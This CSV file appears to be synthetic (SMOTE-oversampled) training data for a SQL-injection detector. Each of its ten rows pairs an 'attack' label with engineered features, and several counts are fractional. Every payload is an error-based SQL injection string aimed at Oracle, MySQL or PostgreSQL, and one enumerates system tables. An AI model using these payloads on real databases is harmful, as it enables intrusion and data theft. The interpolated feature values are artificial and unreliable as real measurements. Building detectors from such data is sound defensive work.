id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,error,"-3626%""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000204,0.8042986983507474,360.10956266378446,31.40637510918962,3.2952687034224857,77.2968124454052,47.10956266378443,170.0,65.70318755459482,0.2146560064971593,0.13080744915399906,0.47208541100262036,0.18245113334622134,0.0,4.0,0.703187554594811,0.0,0.0,3.0,0.0,34.0,2.0,0.0,0.0,23.703187554594813,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.296812445405189,0.703187554594811,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000002,attack,error,1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'jryo'  =  'jryo,nearest_attack_euclidean,R000147,0.6834902708394391,365.19982165723457,34.31113092697394,3.5513278431757183,97.51095258420851,46.244523707895745,158.75547629210425,62.68886907302606,0.2669253995493617,0.1267030455214521,0.4347072469596769,0.17166430796950932,4.0,0.0,0.0,0.0,0.0,3.0,0.0,32.0,0.0,2.0666072190781914,0.31113092697393663,23.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000003,attack,error,"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000155,0.36766372819059856,184.69904036874627,31.755484471758983,3.890444421330041,48.87774223587949,45.5329068305539,64.89968012291541,25.388711179397458,0.2652227620680844,0.24601333377867907,0.3514273555824913,0.13733654857074531,4.0,0.0,0.0,0.0,0.0,2.0,0.0,11.755484471758983,0.0,0.0,5.8777422358794915,3.755484471758983,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.8777422358794913,0.0,0.8777422358794912,0.0,1.1222577641205087,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.8777422358794915
SMOTE_000004,attack,error,"-4135""  )   as leiz where 3582  =  3582 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",nearest_attack_euclidean,R000234,0.08515953199196435,436.2007700339757,35.0,3.51418083017772,111.0,62.0,190.88637431483636,72.31439571913938,0.25448402001227155,0.14214422739424173,0.43758812144695003,0.1657836311465367,0.0,1.0,3.0,0.0,0.0,3.0,0.0,39.314395719139384,0.0,0.0,0.0,32.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,8.0
SMOTE_000005,attack,error,"1  )   where 8734  =  8734 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000129,0.13266240980655922,169.96937818433605,35.939413863479,3.9198575172241354,55.36351681912602,31.0,64.48468909216803,19.12117227304201,0.32570345569466863,0.1824707908615251,0.37933383184963665,0.11249192159416965,0.060586136521003864,0.0,0.0,0.0,0.0,1.0,0.0,13.060586136521003,0.0,0.0,4.0,1.0,0.060586136521003864,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,3.0000000000000004
SMOTE_000006,attack,error,"1""  )   as eibf where 5026  =  5026 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",nearest_attack_euclidean,R000040,0.24440528458571306,351.46538392514157,34.96980758877124,3.664171101563213,95.93961517754246,53.0,143.87923035508493,58.64653839251416,0.2729515278720575,0.1509020023979948,0.40923709130819524,0.1669093784217524,0.0,1.0,2.0,0.0,0.0,3.0,0.0,28.646538392514156,0.0,3.0,0.0,25.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000007,attack,error,"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mmgx"" like ""mmgx",nearest_attack_euclidean,R000099,0.5662361393290835,426.528906260689,36.0,3.5410161393819384,115.789843751527,51.63046874541901,187.318750012216,71.789843751527,0.27147590294255797,0.12107280398108752,0.4391383539523066,0.16831293912404793,0.0,4.0,0.21015624847300268,0.0,0.0,2.0,0.0,39.579687503054,0.0,0.0,0.0,28.210156248473,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,1.789843751526997,0.21015624847300274,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,8.0
SMOTE_000008,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'vvkl'  =  'vvkl",nearest_attack_euclidean,R000199,0.704583714205984,163.01649676179827,27.725773021654703,3.8238320972852007,44.274226978345304,39.0,57.19381582676237,22.548453956690594,0.2717525752564373,0.23945016908954195,0.3505154682157557,0.1382817874382651,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.548453956690592,0.0,0.0,6.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.2742269783452964,0.7257730216547036,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000009,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,2.0250120721759597,168.98984705592096,39.751827846601884,4.295790581835446,92.12266529786332,1.5503655693203768,54.81316049553354,20.50365569320376,0.5422085425563372,0.009174311926605505,0.32362553013449713,0.12499161538256019,3.0,0.0,0.0,0.0,0.0,2.550365569320376,0.0,7.3021934159222575,0.0,5.100731138640752,0.550365569320376,2.550365569320375,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.550365569320376,0.0,0.5503655693203762,1.550365569320376,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,5.651096707961129
SMOTE_000010,attack,error,"-7568""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""jxge"" like ""jxge",nearest_attack_euclidean,R000138,0.9135562128181774,394.2618648896564,38.056779623872586,3.604511020531954,106.77288150450966,49.88644075225483,170.71610188063707,66.88644075225483,0.270741992084964,0.12647554969256591,0.4331004548303118,0.1696820033921583,0.0,4.0,1.0,0.0,0.0,2.0,0.0,35.25762716816988,0.0,2.056779623872585,0.0,24.886440752254828,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.3144067920424718,0.0,0.0,1.3144067920424718,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.628813584084944
